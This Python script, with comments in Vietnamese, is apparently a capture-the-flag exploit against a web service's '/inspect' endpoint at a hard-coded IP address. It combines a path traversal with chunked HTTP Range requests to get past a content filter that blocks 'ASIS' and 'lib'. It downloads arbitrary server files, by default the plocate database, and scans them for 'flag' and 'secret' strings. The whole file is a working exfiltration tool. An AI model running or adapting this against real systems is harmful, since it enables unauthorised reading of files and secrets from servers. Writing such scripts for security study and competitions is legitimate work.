#!/usr/bin/env python3
"""Adaptive ranged downloader: exfil any file past bad_data() ("ASIS"/"lib").

Nguyen ly: cua so lon chi bi tu choi khi chua dung marker. Du lieu binary gan
nhu ngau nhien (xac xuat gap "lib" ~1/16MB) nen chunk 8KB di qua nguyen;
chunk bi tu choi thi de quy xeo doi den toi da 1 byte (luon pass).
"""
import base64
import json
import re
import sys
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor

BASE = "http://91.107.191.73:29994/inspect"
PATH = sys.argv[1] if len(sys.argv) > 1 else "/....//var/lib/plocate/plocate.db"
OUT = sys.argv[2] if len(sys.argv) > 2 else "plocate.db"
CHUNK = 8192
WORKERS = 24


def get(a, b, tries=2):
    """Doc window [a,b] inclusive. None neu bi bad_data tu choi."""
    for _ in range(tries):
        req = urllib.request.Request(
            BASE + "?path=" + urllib.parse.quote(PATH, safe=""))
        req.add_header("Range", f"bytes={a}-{b}")
        try:
            with urllib.request.urlopen(req, timeout=20) as r:
                d = base64.b64decode(json.loads(r.read())["content"])
                if len(d) == b - a + 1:
                    return d
        except Exception:
            continue
    return None


def filesize():
    """Binary search offset dau tien khong doc duoc (416 -> 400)."""
    lo, hi = 0, 1
    while get(hi, hi) is not None:
        lo, hi = hi, hi * 2
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if get(mid, mid) is not None:
            lo = mid
        else:
            hi = mid
    return hi


def download(S):
    out = bytearray(S)
    tasks = [(a, min(a + CHUNK, S) - 1) for a in range(0, S, CHUNK)]
    rnd = 0
    while tasks:
        rnd += 1
        with ThreadPoolExecutor(max_workers=WORKERS) as ex:
            res = list(ex.map(lambda t: (t, get(t[0], t[1])), tasks))
        nxt = []
        for (a, b), data in res:
            if data is not None:
                out[a:a + len(data)] = data
            elif b > a:
                m = (a + b) // 2
                nxt += [(a, m), (m + 1, b)]
            else:
                print(f"! HOLE 1 byte tai {a}", file=sys.stderr)
                out[a] = 0x3F
        tasks = nxt
        print(f"round {rnd}: {len(tasks)} window bi xeo", flush=True)
    return out


if __name__ == "__main__":
    S = filesize()
    print(f"[+] {PATH}: {S} bytes", flush=True)
    data = download(S)
    with open(OUT, "wb") as f:
        f.write(data)
    print(f"[+] da ghi {OUT}", flush=True)

    # triage: strings-scan tim path kha nghi
    strs = re.findall(rb"[ -~]{4,}", data)
    seen, hits = set(), []
    for s in strs:
        low = s.lower()
        if any(k in low for k in (b"flag", b"secret", b"entrypoint", b"baby")):
            if s not in seen:
                seen.add(s)
                hits.append(s)
    print(f"[+] {len(strs)} strings, {len(hits)} kha nghi:", flush=True)
    for h in hits:
        print("   ", h.decode(errors="replace"))
